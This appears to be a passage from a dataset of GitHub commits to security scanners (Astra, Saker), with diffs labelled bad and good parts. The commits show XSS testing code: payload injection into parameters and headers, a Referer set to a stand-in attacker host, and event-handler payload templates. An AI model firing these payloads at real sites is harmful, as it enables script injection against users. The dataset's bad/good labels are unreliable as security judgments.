fetch_xss_payload()\n                for payload in xss_payloads:\n                    # check for URI based XSS\n                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>\n                    if result is not True:\n                        parsed_url = urlparse.urlparse(url)\n                        xss_url = parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload)\n                        xss_request = req.api_request(xss_url,\"GET\",headers)\n                        decoded_payload = xss_payload_decode(payload)\n                        print decoded_payload\n                        print xss_url\n                        if xss_request.text.find(decoded_payload) != -1:\n                            impact = check_xss_impact(xss_request.headers)\n                            logs.logging.info(\"%s is vulnerable to XSS\",url)\n                            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                            if db_update is not True:\n                                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                                dbupdate.insert_record(attack_result)\n                                result,db_update = True,True\n                                vul_param += key\n                            else:\n                                result = True\n                                if vul_param == '':\n                                    vul_param += key\n                                else:\n                                    vul_param += ','+key                  \n        \n            except:\n                logs.logging.info(\"XSS: No GET param found!\")\n\n        if vul_param:\n            # Update all vulnerable params to db.\n            print vul_param,scanid\n            dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : vul_param+\" parameters are vulnerable to XSS\"}})\n\n\ndef xss_check(url,method,headers,body,scanid):\n    # Main function for XSS attack\n    if method == 'GET' or method == 'DEL':\n        xss_get_uri(url,method,headers,body,scanid)\n        xss_get_url(url,method,headers,body,scanid)\n\n    if method == 'POST' or method == 'PUT':\n        xss_post_method(url,method,headers,body,scanid)\n\n    xss_http_headers(url,method,headers,body,scanid)"
                }
            },
            "msg": "Minor changes in xss_post_method function"
        },
        "5f6fdd0979f8a999cc9cac3ea7aa1fbe2c7d8c3c": {
            "url": "https://api.github.com/repos/flipkart-incubator/Astra/commits/5f6fdd0979f8a999cc9cac3ea7aa1fbe2c7d8c3c",
            "html_url": "https://github.com/flipkart-incubator/Astra/commit/5f6fdd0979f8a999cc9cac3ea7aa1fbe2c7d8c3c",
            "sha": "5f6fdd0979f8a999cc9cac3ea7aa1fbe2c7d8c3c",
            "keyword": "XSS change",
            "diff": "diff --git a/modules/xss.py b/modules/xss.py\nindex 0ca843a..eafd147 100644\n--- a/modules/xss.py\n+++ b/modules/xss.py\n@@ -101,7 +101,7 @@ def xss_http_headers(url,method,headers,body,scanid=None):\n \n     # Test for Referer based XSS \n     for payload in xss_payloads:\n-        referer_header_value = 'http://attackersite.com?test='+payload\n+        referer_header_value = 'https://github.com?test='+payload\n         referer_header = {\"Referer\" : referer_header_value}\n         temp_headers.update(referer_header)\n         ref_header_xss = req.api_request(url, \"GET\", temp_headers)\n",
            "message": "",
            "files": {
                "/modules/xss.py": {
                    "changes": [
                        {
                            "diff": "\n \n     # Test for Referer based XSS \n     for payload in xss_payloads:\n-        referer_header_value = 'http://attackersite.com?test='+payload\n+        referer_header_value = 'https://github.com?test='+payload\n         referer_header = {\"Referer\" : referer_header_value}\n         temp_headers.update(referer_header)\n         ref_header_xss = req.api_request(url, \"GET\", temp_headers)\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/modules/xss.py",
                            "badparts": [
                                "        referer_header_value = 'http://attackersite.com?test='+payload"
                            ],
                            "goodparts": [
                                "        referer_header_value = 'https://github.com?test='+payload"
                            ]
                        }
                    ],
                    "source": "\nimport os import urlparse import sendrequest as req import utils.logs as logs import urlparse import time import urllib from utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list=[] if os.getcwd().split('/')[-1]=='API': path='../Payloads/xss.txt' else: path='Payloads/xss.txt' with open(path) as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact(res_headers): print \"response header\",res_headers['Content-Type'] if res_headers['Content-Type']: if res_headers['Content-Type'].find('application/json') !=-1 or res_headers['Content-Type'].find('text/plain') !=-1: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_payload_decode(payload): decoded_payload=urllib.unquote(payload).decode('utf8').encode('ascii','ignore') return decoded_payload def xss_post_method(url,method,headers,body,scanid=None): print url, headers,method,body temp_body={} post_vul_param='' for key,value in body.items(): xss_payloads=fetch_xss_payload() for payload in xss_payloads: temp_body.update(body) temp_body[key]=payload print \"updated body\",temp_body xss_post_request=req.api_request(url, \"POST\", headers, temp_body) decoded_payload=xss_payload_decode(payload) if xss_post_request.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_post_request.headers) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) db_update=True vul_param +=key else: result=True if vul_param=='': post_vul_param +=key else: post_vul_param +=','+key if post_vul_param: dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": post_vul_param+\" are vulnerable to XSS\"}}) def xss_http_headers(url,method,headers,body,scanid=None): temp_headers={} temp_headers.update(headers) xss_payloads=fetch_xss_payload() for payload in xss_payloads: parse_domain=urlparse.urlparse(url).netloc host_header={\"Host\": parse_domain +'/' +payload} headers.update(host_header) host_header_xss=req.api_request(url, \"GET\", headers) decoded_payload=xss_payload_decode(payload) if host_header_xss.text.find(decoded_payload) !=-1: impact=\"Low\" print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers,\"res_body\": host_header_xss.text} dbupdate.insert_record(attack_result) break for payload in xss_payloads: referer_header_value='http://attackersite.com?test='+payload referer_header={\"Referer\": referer_header_value} temp_headers.update(referer_header) ref_header_xss=req.api_request(url, \"GET\", temp_headers) decoded_payload=xss_payload_decode(payload) if ref_header_xss.text.find(decoded_payload) !=-1: print ref_header_xss.text impact=check_xss_impact(temp_headers) print \"%s[{0}]{1} is vulnerable to XSS via referer header%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers,\"res_body\": ref_header_xss.text} dbupdate.insert_record(attack_result) return def xss_get_url(url,method,headers,body,scanid=None): result='' xss_payloads=fetch_xss_payload() uri_check_list=['?', '&', '=', '%3F', '%26', '%3D'] for uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url=='': parsed_url=url for payload in xss_payloads: xss_request_url=req.api_request(parsed_url+'/'+payload,\"GET\",headers) if result is not True: decoded_payload=xss_payload_decode(payload) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_url.headers) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers,\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) result=True xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_uri.headers) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers,\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) def xss_get_uri(url,method,headers,body,scanid=None): db_update='' vul_param='' url_query=urlparse.urlparse(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query: for key,value in parsed_query.items(): try: result='' logs.logging.info(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: parsed_url=urlparse.urlparse(url) xss_url=parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) decoded_payload=xss_payload_decode(payload) print decoded_payload print xss_url if xss_request.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) result,db_update=True,True vul_param +=key else: result=True if vul_param=='': vul_param +=key else: vul_param +=','+key except: logs.logging.info(\"XSS: No GET param found!\") if vul_param: print vul_param,scanid dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": vul_param+\" parameters are vulnerable to XSS\"}}) def xss_check(url,method,headers,body,scanid): if method=='GET' or method=='DEL': xss_get_uri(url,method,headers,body,scanid) xss_get_url(url,method,headers,body,scanid) if method=='POST' or method=='PUT': xss_post_method(url,method,headers,body,scanid) xss_http_headers(url,method,headers,body,scanid) ",
                    "sourceWithComments": "import os\nimport urlparse\nimport sendrequest as req\nimport utils.logs as logs\nimport urlparse\nimport time\nimport urllib\n\nfrom utils.logger import logger\nfrom utils.db import Database_update\nfrom utils.config import get_value\n\ndbupdate = Database_update()\napi_logger = logger()\n\ndef fetch_xss_payload():\n    # Returns xss payloads in list type\n    payload_list = []\n    if os.getcwd().split('/')[-1] == 'API':\n        path = '../Payloads/xss.txt'\n    else:\n        path = 'Payloads/xss.txt'\n\n    with open(path) as f:\n        for line in f:\n            if line:\n                payload_list.append(line.rstrip())\n\n    return payload_list\n\ndef check_xss_impact(res_headers):\n    # Return the impact of XSS based on content-type header\n    print \"response header\",res_headers['Content-Type']\n    if res_headers['Content-Type']:\n        if res_headers['Content-Type'].find('application/json') != -1 or res_headers['Content-Type'].find('text/plain') != -1:\n            # Possible XSS \n            impact = \"Low\"\n        else:\n            impact = \"High\"\n    else:\n        impact = \"Low\"\n\n    return impact\n\n\ndef xss_payload_decode(payload):\n    # Return decoded payload of XSS. \n    decoded_payload = urllib.unquote(payload).decode('utf8').encode('ascii','ignore')\n    return decoded_payload\n\ndef xss_post_method(url,method,headers,body,scanid=None):\n    # This function checks XSS through POST method.\n    print url, headers,method,body\n    temp_body = {}\n    post_vul_param = ''\n    for key,value in body.items():\n        xss_payloads = fetch_xss_payload()\n        for payload in xss_payloads:\n            temp_body.update(body)\n            temp_body[key] = payload\n            print \"updated body\",temp_body\n            xss_post_request = req.api_request(url, \"POST\", headers, temp_body)\n            decoded_payload = xss_payload_decode(payload)\n            if xss_post_request.text.find(decoded_payload) != -1:\n                impact = check_xss_impact(xss_post_request.headers)\n                if db_update is not True:\n                    attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                    dbupdate.insert_record(attack_result)\n                    db_update = True\n                    vul_param += key\n                else:\n                    result = True\n                    if vul_param == '':\n                        post_vul_param += key\n                    else:\n                        post_vul_param += ','+key \n\n    if post_vul_param:\n        dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : post_vul_param+\" are vulnerable to XSS\"}})\n\n\ndef xss_http_headers(url,method,headers,body,scanid=None):\n    # This function checks different header based XSS.\n    # XSS via Host header (Limited to IE)\n    # Reference : http://sagarpopat.in/2017/03/06/yahooxss/\n    temp_headers = {}\n    temp_headers.update(headers)\n    xss_payloads = fetch_xss_payload()\n    for payload in xss_payloads:\n        parse_domain = urlparse.urlparse(url).netloc\n        host_header = {\"Host\" : parse_domain + '/' + payload}\n        headers.update(host_header)\n        host_header_xss = req.api_request(url, \"GET\", headers)\n        decoded_payload = xss_payload_decode(payload)\n        if host_header_xss.text.find(decoded_payload) != -1:\n            impact = \"Low\"\n            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers ,\"res_body\": host_header_xss.text}\n            dbupdate.insert_record(attack_result)\n            break\n\n    # Test for Referer based XSS \n    for payload in xss_payloads:\n        referer_header_value = 'http://attackersite.com?test='+payload\n        referer_header = {\"Referer\" : referer_header_value}\n        temp_headers.update(referer_header)\n        ref_header_xss = req.api_request(url, \"GET\", temp_headers)\n        decoded_payload = xss_payload_decode(payload)\n        if ref_header_xss.text.find(decoded_payload) != -1:\n            print ref_header_xss.text\n            impact = check_xss_impact(temp_headers)\n            print \"%s[{0}] {1} is vulnerable to XSS via referer header%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers ,\"res_body\": ref_header_xss.text}\n            dbupdate.insert_record(attack_result)\n            return\n\n\ndef xss_get_url(url,method,headers,body,scanid=None):\n    # Check for URL based XSS. \n    # Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>\n    result = ''\n    xss_payloads = fetch_xss_payload()\n    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']\n    for uri_list in uri_check_list:\n        if uri_list in url:\n            # Parse domain name from URI.\n            parsed_url = urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path\n            break\n\n    if parsed_url == '':\n        parsed_url = url\n\n    for payload in xss_payloads:\n        xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n        if result is not True:\n            decoded_payload = xss_payload_decode(payload)\n            if xss_request_url.text.find(decoded_payload) != -1:\n                impact = check_xss_impact(xss_request_url.headers)\n                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n                dbupdate.insert_record(attack_result)\n                result = True\n\n        xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n        if xss_request_url.text.find(decoded_payload) != -1:\n            impact = check_xss_impact(xss_request_uri.headers)\n            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n            dbupdate.insert_record(attack_result)\n                \n\ndef xss_get_uri(url,method,headers,body,scanid=None):\n    # This function checks for URI based XSS. \n    # http://localhost/?firstname=<payload>&lastname=<payload>\n    db_update = ''\n    vul_param = ''\n    url_query = urlparse.urlparse(url)\n    parsed_query = urlparse.parse_qs(url_query.query)\n    if parsed_query:\n        for key,value in parsed_query.items():\n            try:\n                result = ''\n                logs.logging.info(\"GET param for xss : %s\",key)\n                xss_payloads = fetch_xss_payload()\n                for payload in xss_payloads:\n                    # check for URI based XSS\n                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>\n                    if result is not True:\n                        parsed_url = urlparse.urlparse(url)\n                        xss_url = parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload)\n                        xss_request = req.api_request(xss_url,\"GET\",headers)\n                        decoded_payload = xss_payload_decode(payload)\n                        print decoded_payload\n                        print xss_url\n                        if xss_request.text.find(decoded_payload) != -1:\n                            impact = check_xss_impact(xss_request.headers)\n                            logs.logging.info(\"%s is vulnerable to XSS\",url)\n                            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                            if db_update is not True:\n                                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                                dbupdate.insert_record(attack_result)\n                                result,db_update = True,True\n                                vul_param += key\n                            else:\n                                result = True\n                                if vul_param == '':\n                                    vul_param += key\n                                else:\n                                    vul_param += ','+key                  \n        \n            except:\n                logs.logging.info(\"XSS: No GET param found!\")\n\n        if vul_param:\n            # Update all vulnerable params to db.\n            print vul_param,scanid\n            dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : vul_param+\" parameters are vulnerable to XSS\"}})\n\n\ndef xss_check(url,method,headers,body,scanid):\n    # Main function for XSS attack\n    if method == 'GET' or method == 'DEL':\n        xss_get_uri(url,method,headers,body,scanid)\n        xss_get_url(url,method,headers,body,scanid)\n\n    if method == 'POST' or method == 'PUT':\n        xss_post_method(url,method,headers,body,scanid)\n\n    xss_http_headers(url,method,headers,body,scanid)"
                }
            },
            "msg": "Minor changes in xss_post_method function"
        }
    },
    "https://github.com/LyleMi/Saker": {
        "bc18f1148918f6cef38f2d7f575482dc43575b7b": {
            "url": "https://api.github.com/repos/LyleMi/Saker/commits/bc18f1148918f6cef38f2d7f575482dc43575b7b",
            "html_url": "https://github.com/LyleMi/Saker/commit/bc18f1148918f6cef38f2d7f575482dc43575b7b",
            "sha": "bc18f1148918f6cef38f2d7f575482dc43575b7b",
            "keyword": "XSS update",
            "diff": "diff --git a/saker/fuzzers/xss.py b/saker/fuzzers/xss.py\nindex 01d4a9a..02252f7 100644\n--- a/saker/fuzzers/xss.py\n+++ b/saker/fuzzers/xss.py\n@@ -20,8 +20,22 @@ def alterTest(self, p=False):\n         return \"<script>alert(/xss/)</script>\"\n \n     def img(self):\n-        payload = \"<img src='%s'></img>\" % self.url\n-        return payload\n+        return '<img/onerror=\"%s\"/src=x>' % payload\n+\n+    def svg(self, payload):\n+        return '<svg/onload=\"%s\"/>' % payload\n+\n+    def style(self, payload):\n+        return '<style/onload=\"%s\"></style>' % payload\n+\n+    def input(self, payload):\n+        return '<input/onfocus=\"%s\"/autofocus>' % payload\n+\n+    def marquee(self, payload):\n+        return '<marquee/onstart=\"%s\"></marquee>' % payload\n+\n+    def div(self, payload):\n+        return '<div/onwheel=\"%s\"/style=\"height:200%;width:100%\"></div>' % payload\n \n     def script(self):\n         payload = \"<script src='%s'></script>\" % self.url\n",
            "message": "",
            "files": {
                "/saker/fuzzers/xss.py": {
                    "changes": [
                        {
                            "diff": "\n         return \"<script>alert(/xss/)</script>\"\n \n     def img(self):\n-        payload = \"<img src='%s'></img>\" % self.url\n-        return payload\n+        return '<img/onerror=\"%s\"/src=x>' % payload\n+\n+    def svg(self, payload):\n+        return '<svg/onload=\"%s\"/>' % payload\n+\n+    def style(self, payload):\n+        return '<style/onload=\"%s\"></style>' % payload\n+\n+    def input(self, payload):\n+        return '<input/onfocus=\"%s\"/autofocus>' % payload\n+\n+    def marquee(self, payload):\n+        return '<marquee/onstart=\"%s\"></marquee>' % payload\n+\n+    def div(self, payload):\n+        return '<div/onwheel=\"%s\"/style=\"height:200%;width:100%\"></div>' % payload\n \n     def script(self):\n         payload = \"<script src='%s'></script>\" % self.url\n",
                            "add": 16,
                            "remove": 2,
                            "filename": "/saker/fuzzers/xss.py",
                            "badparts": [
                                "        payload = \"<img src='%s'></img>\" % self.url",
                                "        return payload"
                            ],
                            "goodparts": [
                                "        return '<img/onerror=\"%s\"/src=x>' % payload",
                                "    def svg(self, payload):",
                                "        return '<svg/onload=\"%s\"/>' % payload",
                                "    def style(self, payload):",
                                "        return '<style/onload=\"%s\"></style>' % payload",
                                "    def input(self, payload):",
                                "        return '<input/onfocus=\"%s\"/autofocus>' % payload",
                                "    def marquee(self, payload):",
                                "        return '<marquee/onstart=\"%s\"></marquee>' % payload",
                                "    def div(self, payload):",
                                "        return '<div/onwheel=\"%s\"/style=\"height:200%;width:100%\"></div>' % payload"
                            ]
                        }
                    ],
                    "source": "\n from saker.fuzzers.fuzzer import Fuzzer class XSS(Fuzzer): \"\"\"generate XSS payload\"\"\" def __init__(self, url=\"\"): \"\"\" url: xss payload url \"\"\" super(XSS, self).__init__() self.url=url @staticmethod def alterTest(self, p=False): return \"<script>alert(/xss/)</script>\" def img(self): payload=\"<img src='%s'></img>\" % self.url return payload def script(self): payload=\"<script src='%s'></script>\" % self.url return payload def event(self, element, src, event, js): payload=\"<%s src=\" % element payload +='\"%s\" ' % src payload +=event payload +=\"=%s >\" % js return payload def cspBypass(self): return \"<link rel='preload' href='%s'>\" % self.url ",
                    "sourceWithComments": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nfrom saker.fuzzers.fuzzer import Fuzzer\n\n\nclass XSS(Fuzzer):\n\n    \"\"\"generate XSS payload\"\"\"\n\n    def __init__(self, url=\"\"):\n        \"\"\"\n        url: xss payload url\n        \"\"\"\n        super(XSS, self).__init__()\n        self.url = url\n\n    @staticmethod\n    def alterTest(self, p=False):\n        return \"<script>alert(/xss/)</script>\"\n\n    def img(self):\n        payload = \"<img src='%s'></img>\" % self.url\n        return payload\n\n    def script(self):\n        payload = \"<script src='%s'></script>\" % self.url\n        return payload\n\n    def event(self, element, src, event, js):\n        payload = \"<%s src=\" % element\n        payload += '\"%s\" ' % src\n        payload += event\n        payload += \"=%s >\" % js\n        return payload\n\n    def cspBypass(self):\n        return \"<link rel='preload' href='%s'>\" % self.url\n"
                }
            },
            "msg": "update xss payload"
        },
        "47abf048e510b5be0118d7fc390d0f0202040bca": {
            "url": "https://api.github.com/repos/LyleMi/Saker/commits/47abf048e510b5be0118d7fc390d0f0202040bca",
            "html_url": "https://github.com/LyleMi/Saker/commit/47abf048e510b5be0118d7fc390d0f0202040bca",
            "sha": "47abf048e510b5be0118d7fc390d0f0202040bca",
            "keyword": "XSS update",
            "diff": "diff --git a/saker/fuzzers/xss.py b/saker/fuzzers/xss.py\nindex 02252f7..4bc1d5b 100644\n--- a/saker/fuzzers/xss.py\n+++ b/saker/fuzzers/xss.py\n@@ -3,11 +3,285 @@\n \n from saker.fuzzers.fuzzer import Fuzzer\n \n+_tags = [\n+    'a',\n+    'abbr',\n+    'acronym',\n+    'address',\n+    'applet',\n+    'area',\n+    'article',\n+    'aside',\n+    'audio',\n+    'b',\n+    'base',\n+    'basefont',\n+    'bdi',\n+    'bdo',\n+    'bgsound',\n+    'big',\n+    'blink',\n+    'blockquote',\n+    'body',\n+    'br',\n+    'button',\n+    'canvas',\n+    'caption',\n+    'center',\n+    'cite',\n+    'code',\n+    'col',\n+    'colgroup',\n+    'command',\n+    'content',\n+    'data',\n+    'datalist',\n+    'dd',\n+    'del',\n+    'details',\n+    'dfn',\n+    'dialog',\n+    'dir',\n+    'div',\n+    'dl',\n+    'dt',\n+    'element',\n+    'em',\n+    'embed',\n+    'fieldset',\n+    'figcaption',\n+    'figure',\n+    'font',\n+    'footer',\n+    'form',\n+    'frame',\n+    'frameset',\n+    'h1',\n+    'h2',\n+    'h3',\n+    'h4',\n+    'h5',\n+    'h6',\n+    'head',\n+    'header',\n+    'hgroup',\n+    'hr',\n+    'html',\n+    'i',\n+    'iframe',\n+    'image',\n+    'img',\n+    'input',\n+    'ins',\n+    'isindex',\n+    'kbd',\n+    'keygen',\n+    'label',\n+    'layer',\n+    'legend',\n+    'li',\n+    'link',\n+    'listing',\n+    'main',\n+    'map',\n+    'mark',\n+    'marquee',\n+    'menu',\n+    'menuitem',\n+    'meta',\n+    'meter',\n+    'multicol',\n+    'nav',\n+    'nobr',\n+    'noembed',\n+    'noframes',\n+    'nolayer',\n+    'noscript',\n+    'object',\n+    'ol',\n+    'optgroup',\n+    'option',\n+    'output',\n+    'p',\n+    'param',\n+    'picture',\n+    # 'plaintext',\n+    'pre',\n+    'progress',\n+    'q',\n+    'rp',\n+    'rt',\n+    'rtc',\n+    'ruby',\n+    's',\n+    'samp',\n+    'script',\n+    'section',\n+    'select',\n+    'shadow',\n+    'small',\n+    'source',\n+    'spacer',\n+    'span',\n+    'strike',\n+    'strong',\n+    'style',\n+    'sub',\n+    'summary',\n+    'sup',\n+    'table',\n+    'tbody',\n+    'td',\n+    'template',\n+    'textarea',\n+    'tfoot',\n+    'th',\n+    'thead',\n+    'time',\n+    'title',\n+    'tr',\n+    'track',\n+    'tt',\n+    'u',\n+    'ul',\n+    'var',\n+    'video',\n+    'wbr',\n+    'xmp',\n+]\n+\n+_events = [\n+    'onabort',\n+    'onautocomplete',\n+    'onautocompleteerror',\n+    'onafterscriptexecute',\n+    'onanimationend',\n+    'onanimationiteration',\n+    'onanimationstart',\n+    'onbeforecopy',\n+    'onbeforecut',\n+    'onbeforeload',\n+    'onbeforepaste',\n+    'onbeforescriptexecute',\n+    'onbeforeunload',\n+    'onbegin',\n+    'onblur',\n+    'oncanplay',\n+    'oncanplaythrough',\n+    'onchange',\n+    'onclick',\n+    'oncontextmenu',\n+    'oncopy',\n+    'oncut',\n+    'ondblclick',\n+    'ondrag',\n+    'ondragend',\n+    'ondragenter',\n+    'ondragleave',\n+    'ondragover',\n+    'ondragstart',\n+    'ondrop',\n+    'ondurationchange',\n+    'onend',\n+    'onemptied',\n+    'onended',\n+    'onerror',\n+    'onfocus',\n+    'onfocusin',\n+    'onfocusout',\n+    'onhashchange',\n+    'oninput',\n+    'oninvalid',\n+    'onkeydown',\n+    'onkeypress',\n+    'onkeyup',\n+    'onload',\n+    'onloadeddata',\n+    'onloadedmetadata',\n+    'onloadstart',\n+    'onmessage',\n+    'onmousedown',\n+    'onmouseenter',\n+    'onmouseleave',\n+    'onmousemove',\n+    'onmouseout',\n+    'onmouseover',\n+    'onmouseup',\n+    'onmousewheel',\n+    'onoffline',\n+    'ononline',\n+    'onorientationchange',\n+    'onpagehide',\n+    'onpageshow',\n+    'onpaste',\n+    'onpause',\n+    'onplay',\n+    'onplaying',\n+    'onpopstate',\n+    'onprogress',\n+    'onratechange',\n+    'onreset',\n+    'onresize',\n+    'onscroll',\n+    'onsearch',\n+    'onseeked',\n+    'onseeking',\n+    'onselect',\n+    'onselectionchange',\n+    'onselectstart',\n+    'onstalled',\n+    'onstorage',\n+    'onsubmit',\n+    'onsuspend',\n+    'ontimeupdate',\n+    'ontoggle',\n+    'ontouchcancel',\n+    'ontouchend',\n+    'ontouchmove',\n+    'ontouchstart',\n+    'ontransitionend',\n+    'onunload',\n+    'onvolumechange',\n+    'onwaiting',\n+    'onwebkitanimationend',\n+    'onwebkitanimationiteration',\n+    'onwebkitanimationstart',\n+    'onwebkitfullscreenchange',\n+    'onwebkitfullscreenerror',\n+    'onwebkitkeyadded',\n+    'onwebkitkeyerror',\n+    'onwebkitkeymessage',\n+    'onwebkitneedkey',\n+    'onwebkitsourceclose',\n+    'onwebkitsourceended',\n+    'onwebkitsourceopen',\n+    'onwebkitspeechchange',\n+    'onwebkittransitionend',\n+    'onwheel'\n+]\n+\n+_htmlTemplate = '''\n+<!DOCTYPE html>\n+<html>\n+<head>\n+    <title>XSS Fuzzer</title>\n+    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\n+</head>\n+<body>\n+%s\n+</body>\n+</html>\n+'''\n+\n \n class XSS(Fuzzer):\n \n     \"\"\"generate XSS payload\"\"\"\n \n+    tags = _tags\n+    events = _events\n+    htmlTemplate = _htmlTemplate\n+\n     def __init__(self, url=\"\"):\n         \"\"\"\n         url: xss payload url\n@@ -15,11 +289,21 @@ def __init__(self, url=\"\"):\n         super(XSS, self).__init__()\n         self.url = url\n \n-    @staticmethod\n-    def alterTest(self, p=False):\n+    @classmethod\n+    def alterTest(cls, p=False):\n         return \"<script>alert(/xss/)</script>\"\n \n-    def img(self):\n+    @classmethod\n+    def genTestHTML(cls):\n+        s = ''\n+        for t in cls.tags:\n+            s += '<%s src=\"x\"' % t\n+            for e in cls.events:\n+                s += ''' %s=\"console.log('%s %s')\" ''' % (e, t, e)\n+            s += '>%s</%s>\\n' % (t, t)\n+        return cls.htmlTemplate % s\n+\n+    def img(self, payload):\n         return '<img/onerror=\"%s\"/src=x>' % payload\n \n     def svg(self, payload):\n",
            "message": "",
            "files": {
                "/saker/fuzzers/xss.py": {
                    "changes": [
                        {
                            "diff": "\n         super(XSS, self).__init__()\n         self.url = url\n \n-    @staticmethod\n-    def alterTest(self, p=False):\n+    @classmethod\n+    def alterTest(cls, p=False):\n         return \"<script>alert(/xss/)</script>\"\n \n-    def img(self):\n+    @classmethod\n+    def genTestHTML(cls):\n+        s = ''\n+        for t in cls.tags:\n+            s += '<%s src=\"x\"' % t\n+            for e in cls.events:\n+                s += ''' %s=\"console.log('%s %s')\" ''' % (e, t, e)\n+            s += '>%s</%s>\\n' % (t, t)\n+        return cls.htmlTemplate % s\n+\n+    def img(self, payload):\n         return '<img/onerror=\"%s\"/src=x>' % payload\n \n     def svg(self, payload):\n",
                            "add": 13,
                            "remove": 3,
                            "filename": "/saker/fuzzers/xss.py",
                            "badparts": [
                                "    @staticmethod",
